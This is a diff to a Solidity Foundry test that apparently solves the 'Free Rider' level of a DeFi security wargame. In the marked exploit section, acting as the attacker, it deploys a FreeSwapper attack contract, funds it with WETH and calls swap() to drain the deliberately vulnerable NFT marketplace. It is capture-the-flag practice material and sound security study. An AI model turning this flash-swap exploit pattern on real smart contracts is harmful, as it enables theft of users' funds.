@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
 
+import {FreeSwapper} from "../../../src/Contracts/free-rider/FreeSwapper.sol";
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
@@ -135,6 +136,20 @@ contract FreeRider is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker, attacker);
+
+        FreeSwapper freeSwapper = new FreeSwapper(
+            address(freeRiderBuyer),
+            payable(address(freeRiderNFTMarketplace)),
+            address(damnValuableNFT),
+            address(uniswapV2Factory),
+            address(dvt),
+            payable(address(weth))
+        );
+
+        weth.deposit{value: attacker.balance}();
+        weth.transfer(address(freeSwapper), weth.balanceOf(attacker));
+
+        freeSwapper.swap();
 
         vm.stopPrank();
         /**
